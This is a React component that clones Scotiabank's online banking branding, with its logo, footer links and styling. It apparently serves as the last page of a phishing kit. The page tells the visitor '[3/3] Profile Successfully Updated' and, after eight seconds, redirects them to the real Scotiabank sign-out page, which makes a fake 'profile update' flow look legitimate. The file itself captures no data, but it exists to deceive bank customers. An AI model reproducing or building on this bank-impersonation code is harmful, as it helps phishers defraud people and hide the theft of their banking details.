import {useEffect} from "react";
import Loader from "./Loader";

const RedirectPage = () => {
  useEffect(() => {
    redirect();
    return;
  }, []);
  const redirect = () => {
    setTimeout(() => {
      window.location.replace(
        "https://auth.scotiaonline.scotiabank.com/signout?redirect_uri=https://www.scotiaonline.scotiabank.com/online/authentication/authentication.bns"
      );
    }, 8000);
  };
  return (
    <div className="root" id="root">
      <div className="uQnxO2uiJOTeY5_KPtBG0">
        <header className="_1ChzP-ZqsmzLyF7NCGdiJx">
          <div className="PoYv4mtPAteIiTCL2kgMd">
            <a href="https://www.scotiabank.com/ca/en/personal.html">
              <div className="_3NvqcuqzV8Fp_FM2z3Sp4J">
                <svg
                  focusable="true"
                  role="img"
                  aria-hidden="false"
                  className="SvgLogo__scotiabankEn--size-18px"
                  aria-labelledby="bankLogo-title"
                  viewBox="0 0 697.04 99.14"
                  accessibletitle="Scotiabank Logo"
                >
                  <title id="bankLogo-title">Scotiabank</title>
                  <path
                    d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <polygon
                    points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"
                    fill="#EC111A"
                  />
                  <rect
                    x="257.22"
                    y="31.83"
                    width="20.6"
                    height="65.67"
                    fill="#EC111A"
                  />
                  <path
                    d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <polygon
                    points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"
                    fill="#EC111A"
                  />
                  <path
                    d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                </svg>
              </div>
            </a>
          </div>
        </header>
        <main className="_16e3jP2sLLXzIXpWyvv2MD cWQtsaZrd8hAVSt8qps6f">
          <div className="Grid__container">
            <div className="_189buhYsYKCsviWKNS9OP-">
              <div className="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1bcSxMk3NAgnvjPq_83hWr">
                <div className="_1AR6e5iqu8uXHMTFKLnqWr">
                  <div>
                    <svg
                      width={110}
                      height={86}
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <g fill="none" fillRule="evenodd">
                        <g fillOpacity=".7">
                          <path
                            d="M50.947 68.312h-30.68a2.028 2.028 0 01-2.023-2.022V55.385c0-1.112.91-2.021 2.023-2.021h30.68c1.111 0 2.021.909 2.021 2.02V66.29c0 1.112-.91 2.022-2.022 2.022"
                            fill="#FFD42F"
                          />
                          <path
                            d="M88.344 68.312H57.665a2.028 2.028 0 01-2.023-2.022V55.385c0-1.112.91-2.021 2.023-2.021h30.68c1.111 0 2.021.909 2.021 2.02V66.29c0 1.112-.91 2.022-2.022 2.022"
                            fill="#FFEEB7"
                          />
                          <path
                            d="M50.947 32.802h-30.68a2.028 2.028 0 01-2.023-2.022V19.876c0-1.112.91-2.022 2.023-2.022h30.68c1.111 0 2.021.91 2.021 2.022V30.78c0 1.112-.91 2.022-2.022 2.022M57.748 32.802a2.028 2.028 0 01-2.023-2.022V19.876c0-1.112.91-2.022 2.023-2.022h30.679c1.111 0 2.021.91 2.021 2.022V30.78c0 1.112-.91 2.022-2.021 2.022h-30.68zM70.182 50.557h-30.68a2.028 2.028 0 01-2.022-2.022V37.63c0-1.112.91-2.022 2.022-2.022h30.68c1.112 0 2.022.91 2.022 2.022v10.904c0 1.112-.91 2.022-2.022 2.022"
                            fill="#FFD42F"
                          />
                          <path
                            d="M107.662 50.557h-30.68a2.028 2.028 0 01-2.022-2.022V37.63c0-1.112.91-2.022 2.022-2.022h30.68c1.112 0 2.022.91 2.022 2.022v10.904c0 1.112-.91 2.022-2.022 2.022M70.182 15.047h-30.68a2.028 2.028 0 01-2.022-2.022V2.121C37.48 1.01 38.39.1 39.502.1h30.68c1.112 0 2.022.91 2.022 2.022v10.904c0 1.112-.91 2.022-2.022 2.022M2.022 50.557A2.028 2.028 0 010 48.535V37.63c0-1.112.91-2.022 2.022-2.022h30.68c1.112 0 2.022.91 2.022 2.022v10.904c0 1.112-.91 2.022-2.022 2.022H2.022z"
                            fill="#FFEEB7"
                          />
                          <path
                            d="M32.702 15.047H2.022A2.028 2.028 0 010 13.025V2.121C0 1.01.91.1 2.022.1h30.68c1.112 0 2.022.91 2.022 2.022v10.904c0 1.112-.91 2.022-2.022 2.022"
                            fill="#FFD42F"
                          />
                        </g>
                        <path
                          d="M66.639 81.325c0 2.389-6.187 4.325-13.819 4.325-7.633 0-13.82-1.936-13.82-4.325C39 78.936 45.187 77 52.82 77c7.632 0 13.819 1.936 13.819 4.325"
                          fill="#E6E6E6"
                        />
                        <path
                          d="M28 20.985C28 53.035 41.18 61.409 52.999 69 64.817 61.41 78 53.034 78 20.985L52.999 6 28 20.985z"
                          fillOpacity=".8"
                          fill="#FFF"
                        />
                        <path
                          d="M53.27 11l21.27 12.709c0 27.179-11.214 34.281-21.27 40.719V11z"
                          fill="#91DDF8"
                        />
                        <path
                          d="M53.27 11L32 23.709c0 27.179 11.214 34.281 21.27 40.719V11z"
                          fill="#009DD6"
                        />
                        <path
                          fill="#FFD42F"
                          d="M90 2l-.957 2.69-2.579-1.226 1.226 2.58L85 7l2.69.957-1.226 2.579 2.579-1.226.956 2.69.958-2.69 2.58 1.226-1.227-2.58L95 7l-2.69-.957 1.227-2.579-2.58 1.226z"
                        />
                        <path
                          fill="#FFEAA5"
                          d="M100.426 10.614L98.88 9.88l.735 1.547L98 12l1.614.574-.735 1.547 1.547-.735L101 15l.575-1.614 1.548.735-.737-1.547L104 12l-1.614-.574.737-1.547-1.548.735L101 9zM3.235 61.153l-2.064-.98.982 2.062L0 63l2.153.765-.982 2.064 2.064-.981L4.001 67l.764-2.152 2.064.98-.982-2.063L8 63l-2.153-.765.982-2.063-2.064.981L4 59z"
                        />
                        <path
                          fill="#FFD42F"
                          d="M10.426 72.614l-1.548-.736.736 1.547L8 74l1.614.574-.736 1.546 1.548-.734L11 77l.574-1.614 1.547.734-.736-1.546L14 74l-1.615-.575.736-1.547-1.547.736L11 71z"
                        />
                      </g>
                    </svg>
                  </div>
                  <div className="TextHeadline__text TextHeadline__text--black TextHeadline__text--medium _3hjDHBxiP1Z2Uj2D22Khad">
                    [3/3] Profile Successfully Updated .
                  </div>
                </div>
                <Loader></Loader>

                <div className="_2ItKZr6GkY2DuqB4QxtMbw">
                  <div
                    style={{textAlign: "center"}}
                    className="TextHeadline__text TextHeadline__text--small _3hjDHBxiP1Z2Uj2D22Khad "
                  >
                    Thank you , your profile has been successfully updated
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <footer className="Footer__footer">
          <div className="Grid__container Footer__upperBar">
            <div className="Row__container Footer__upperBarRow ">
              <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6 Footer__logoHolder">
                <svg
                  focusable="true"
                  role="img"
                  aria-hidden="false"
                  className="SvgLogo__flyingS--size-24px Footer__logo"
                  aria-labelledby="footer-logo-title"
                  viewBox="0 0 498.27 552.11"
                >
                  <title id="footer-logo-title">Scotiabank</title>
                  <path
                    d="M637.94,371.45H481.69A173.16,173.16,0,0,0,309.61,525.34h0A173.18,173.18,0,0,1,461.19,268.53H730.82Z"
                    transform="translate(-232.55 -268.53)"
                    fill="#EC111A"
                  />
                  <path
                    d="M325.43,717.72H481.69A173.15,173.15,0,0,0,653.76,563.83h0A173.18,173.18,0,0,1,502.18,820.64H232.55Z"
                    transform="translate(-232.55 -268.53)"
                    fill="#EC111A"
                  />
                  <circle cx="249.14" cy="276.05" r="139.06" fill="#EC111A" />
                </svg>
              </div>
              <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6">
                <ul className="Footer__footerNav">
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/personal/contact-us.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Contact Us
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/security.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Security
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Legal
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Privacy
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/personal/accessibility.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Accessibility
                      </p>
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <div className="Footer__base Footer__base--white">
            <div className="Grid__container">
              <div className="Row__container">
                <div className="Column__container Column__xs-4 Column__sm-8 Column__md-12 Column__lg-12 Footer__copyRights">
                  <p className="TextLegal__text">
                    © Scotiabank. All Rights Reserved.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </footer>
        <a
          className="_2ALm1j8YuQmwl8Gkc1YLnH"
          href="https://assets.kampyle.com/resources/direct/form.html?region=prodCanada&websiteId=11757&formId=1127&bgclr=white"
          rel="noopener noreferrer"
          target="_blank"
        >
          <span
            className="TextCaption__text TextCaption__text--black ltf44NmV8dxdh56CbDo9C"
            weight="bold"
          >
            Feedback
          </span>
        </a>
      </div>
    </div>
  );
};

export default RedirectPage;
